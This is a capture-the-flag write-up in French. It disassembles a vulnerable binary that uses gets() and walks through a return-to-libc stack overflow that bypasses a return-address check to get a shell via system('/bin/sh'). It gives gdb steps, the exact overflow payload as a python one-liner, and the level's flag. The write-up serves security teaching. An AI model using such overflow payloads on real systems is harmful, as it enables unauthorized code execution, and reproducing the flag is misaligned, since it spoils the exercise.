```s
080484d4 <p>:
 80484d4:	55                   	push   ebp
 80484d5:	89 e5                	mov    ebp,esp
 80484d7:	83 ec 68             	sub    esp,0x68 ; 104
 80484da:	a1 60 98 04 08       	mov    eax,ds:0x8049860 ; une fonction (stdout@@GLIBC_2.0)
 80484df:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt> ; fflush(stdout)
 80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c] ; On prend un pointeur sur la stack stack - 76
 80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt> ; on rempli du coup le pointeur vers les 76B.
 80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4] ; 80 à 84e char de notre buffer.
 80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax ; mov l'adresse dans ebp-12
 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000 ; eax & 0xb0000000 == 0xb0000000
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    eax,0x8048620   ; (%p)\n (objdump -s) -- donne le ptr stocké à partir ebp+0x4.
 804850c:	8b 55 f4             	mov    edx,DWORD PTR [ebp-0xc] ; prend l'adresse stocké grâce au buffer overflow
 804850f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx ; l'envoie en tant que premier argument variadique de printf
 8048513:	89 04 24             	mov    DWORD PTR [esp],eax ; puis move eax dans la stack pour être utilisé en format de printf.
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt> ; exit 1
 8048527:	8d 45 b4             	lea    eax,[ebp-0x4c]
 804852a:	89 04 24             	mov    DWORD PTR [esp],eax
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt> ; puts la clé (qui est notre stdin) ?
 8048532:	8d 45 b4             	lea    eax,[ebp-0x4c]
 8048535:	89 04 24             	mov    DWORD PTR [esp],eax
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 804853d:	c9                   	leave
 804853e:	c3                   	ret


0804853f <main>:
 804853f:	55                   	push   ebp
 8048540:	89 e5                	mov    ebp,esp
 8048542:	83 e4 f0             	and    esp,0xfffffff0
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave  
 804854b:	c3                   	ret    
 804854c:	90                   	nop
 804854d:	90                   	nop
 804854e:	90                   	nop
 804854f:	90                   	nop
```

La difficulté ici, est d'écrire des codes d'opérations à exécuter (donc injecter du code), dans la mémoire chargée de l'ordinateur, et remplacer la valeur de retour par le pointeur sur ce code.
Mais, on a une sécurité à bypass. C'est le fameux `eax & 0xb0000000 == 0xb0000000`. On est quasiment sûr que notre exploit sera contenu à cet adresse.

https://shell-storm.org/shellcode/index.html
1. On overflow.
2. On essaie d'override des instructions avec un shellcode `execve("/bin/sh")`.


String `/bin/sh` présente dans la libc.so a l'offset `0x160c58` (`objdump -s`)
```
(gdb) info proc map # Get the start address
(gdb) x/s 0xb7e2c000+0x160c58
0xb7f8cc58:	 "/bin/sh"
```

Donc on va overflow deux adresses. La première sera l'adresse de `ret`, afin de passer au destack de l'adresse suivante n'étant pas soumise à vérification.
La seconde adresse va pointer vers la fonction `system` comprise dans la `libc`, puis, on va ajouter l'adresse de retour de `system` dans la stack, et enfin, on pourra mettre le premier argument pour `system`, c'est-à-dire, la chaine de caractère trouvée dans la `libc`.

`python -c 'print("A"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x90\x90\x90\x90" + "\x58\xcc\xf8\xb7")'`

Flag: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`